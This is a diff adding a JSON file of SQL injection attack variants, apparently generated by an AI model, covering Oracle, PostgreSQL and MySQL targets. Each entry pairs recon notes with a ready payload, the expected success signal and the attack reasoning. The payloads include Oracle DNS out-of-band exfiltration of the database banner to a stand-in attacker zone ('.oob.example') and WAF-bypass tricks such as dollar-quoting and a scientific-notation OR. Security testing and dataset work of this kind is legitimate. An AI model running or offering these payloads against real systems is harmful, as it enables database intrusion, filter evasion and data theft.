@@ -1,0 +1,68 @@
+{
+ "key": "sqli_7",
+ "model": "opencode/space-bunny-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "GET /internal/metrics/healthcheck",
+   "target_param": "X-Request-Source",
+   "recon_evidence": "Oracle back end returning ORA-01756 quoted-string errors on malformed values; production network permits no outbound TCP or ICMP, DNS resolution is the only egress; the request filter normalizes query and body values but passes header values through verbatim; banner-sized data must leave in 20-byte chunks.",
+   "planner_rationale": "Out-of-band is the only channel left, so use UTL_INADDR.GET_HOST_ADDRESS with LOWER(RAWTOHEX(...)) to hex-encode a 20-byte slice of v$version.banner into a DNS-safe label with a sequence index.",
+   "vuln_class": "sqli",
+   "payload": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM = 1), 1, 20)))) || '.01.oob.example') FROM dual",
+   "injection_point": "header",
+   "expected_success_signal": "Sequential 01 then 02 hex labels under .oob.example resolved at the attacker nameserver within seconds while the page still returns HTTP 200",
+   "confidence": 0.82,
+   "reasoning": "The header value is concatenated into the WHERE/ORDER BY clause without the normalisation applied to query parameters, so the Oracle expression survives the keyword filter. The nested DNS lookup fires during statement execution, so the callback is logged even though the returned row is discarded when the ACL error is raised."
+  },
+  {
+   "endpoint": "GET /api/v1/inventory/snapshot",
+   "target_param": "warehouse",
+   "recon_evidence": "Oracle 19c confirmed by a UNION column-count error referencing v$version; the segment has DNS-only egress; the WAF blacklist covers xp_cmdshell, dbms_scheduler and lib but not UTL_INADDR or RAWTOHEX; responses are long enough that a full banner dump would exceed the label length limit.",
+   "planner_rationale": "Exfiltrate sequentially: push the first 20 bytes of v$version.banner as a lowercase hex DNS label and increment the suffix for later chunks.",
+   "vuln_class": "sqli",
+   "payload": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM = 1), 1, 20)))) || '.01.oob.example') FROM dual",
+   "injection_point": "query",
+   "expected_success_signal": "One hex label per request, e.g. 01 then 02 in the .oob.example zone, captured at the authoritative server even though the page body shows an ORA error",
+   "confidence": 0.86,
+   "reasoning": "v$version is directly selectable and the function stack (UTL_INADDR, RAWTOHEX, CAST_TO_RAW) matches none of the observed blacklist signatures, so the expression is injected unchanged. Substr caps each chunk at 20 bytes to stay within DNS label limits, and the resolver already has the data before the ACL error aborts the query."
+  },
+  {
+   "endpoint": "GET /store/checkout",
+   "target_param": "cart_ref",
+   "recon_evidence": "PostgreSQL 14 backend; the middleware strips every single quote from cookie values before concatenating them into ... WHERE cart_ref = '$cart_ref' ...; an empty cart_ref produces a clean syntax error page instead of a WAF block, confirming the statement is still parsed server side; no quote character can reach the database.",
+   "planner_rationale": "Dollar-quoting is native to PostgreSQL, so $$...$$ replaces the quoted literal entirely and keeps the SELECT probe alive behind the quote filter.",
+   "vuln_class": "sqli",
+   "payload": "SELECT $$hacktricks$$",
+   "injection_point": "cookie",
+   "expected_success_signal": "The literal text hacktricks echoed back in the page or error payload, confirming server-side evaluation with zero quote characters",
+   "confidence": 0.88,
+   "reasoning": "The filter only deletes apostrophes, and dollar signs are untouched, so the payload is assembled as ... WHERE cart_ref = ''SELECT $$hacktricks$$'' and PostgreSQL parses $$ as a quoted constant delimiter. This proves the injection point and evaluation context without any character the filter targets."
+  },
+  {
+   "endpoint": "POST /api/v3/orders/lookup",
+   "target_param": "order_id",
+   "recon_evidence": "MySQL 8 behind AWS WAF managed rules; every or, and, union, sleep and comment token inside JSON body values returns 403, while values that are syntactically valid numbers or decimal/scientific literals pass JSON schema validation and reach the query.",
+   "planner_rationale": "Replace the boolean OR with a truthy scientific-notation literal (1337.1337e1) that MySQL evaluates numerically but the WAF tokeniser never classifies as an OR-based payload.",
+   "vuln_class": "sqli",
+   "payload": "-1' or 1337.1337e1 or '1'='1",
+   "injection_point": "body",
+   "expected_success_signal": "An unrelated order record returned with HTTP 200 where the classic or 1=1 body value returns 403",
+   "confidence": 0.9,
+   "reasoning": "The WAF is clearly token-based against classic OR syntax, and 1337.1337e1 is a well-formed DOUBLE literal that MySQL parses as 13371.33 and treats as non-zero in boolean context. Because it contains no or/and keyword, the request clears the rule set while the surrounding quotes still build the same three-clause boolean expression."
+  },
+  {
+   "endpoint": "GET /store/p/25/reviews",
+   "target_param": "product_id",
+   "recon_evidence": "The /store/p/{product_id}/reviews segment is substituted into ... WHERE product_id = %s ORDER BY created_at; the WAF inspects the decoded path segment and blocks segments containing or/and tokens with403; the framework router forwards apostrophes unencoded for this route; the value is coerced to a numeric comparison.",
+   "planner_rationale": "Keep the same path shape but swap the OR comparison for a truthy scientific-notation literal so the WAF path regex finds no boolean keyword.",
+   "vuln_class": "sqli",
+   "payload": "-1' or 1337.1337e1 or '1'='1",
+   "injection_point": "path",
+   "expected_success_signal": "Review list belonging to a different product rendered with HTTP 200, versus403 for the classic or-true path segment",
+   "confidence": 0.66,
+   "reasoning": "The payload maps onto a single numeric path segment and MySQL evaluates 1337.1337e1 as a non-zero double, so the boolean chain stays true without any blocked keyword. Confidence is lower because path segments are commonly percent-encoded or normalised by the router before reaching the driver, and the surviving quote characters were only partially confirmed by the observed 403-versus-200 difference."
+  }
+ ],
+ "raw_tail": "th segment and MySQL evaluates 1337.1337e1 as a non-zero double, so the boolean chain stays true without any blocked keyword. Confidence is lower because path segments are commonly percent-encoded or normalised by the router before reaching the driver, and the surviving quote characters were only partially confirmed by the observed 403-versus-200 difference.\"\n  }\n]\n\u001b[0m\n> build · space-bunny-free\n"
+}
